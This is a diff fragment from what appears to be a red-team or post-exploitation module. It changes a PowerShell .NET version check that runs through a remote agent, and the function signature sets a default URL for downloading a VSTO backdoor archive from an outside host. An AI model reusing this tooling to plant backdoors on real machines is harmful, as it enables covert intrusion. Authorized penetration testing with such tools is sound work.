@@ -30,7 +30,7 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
     findDotNet = """Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse |
                     Get-ItemProperty -name Version,Release -EA 0 |
                     Where { $_.PSChildName -match '^(?!S)\\p{L}'} |
-                    Select PSChildName, Version, Release"""
+                    Select PSChildName, Version"""
     opts['command'] = findDotNet
     if(" 4." not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
         raise ValueError('No .NET 4 Client Profile, cannot proceed')
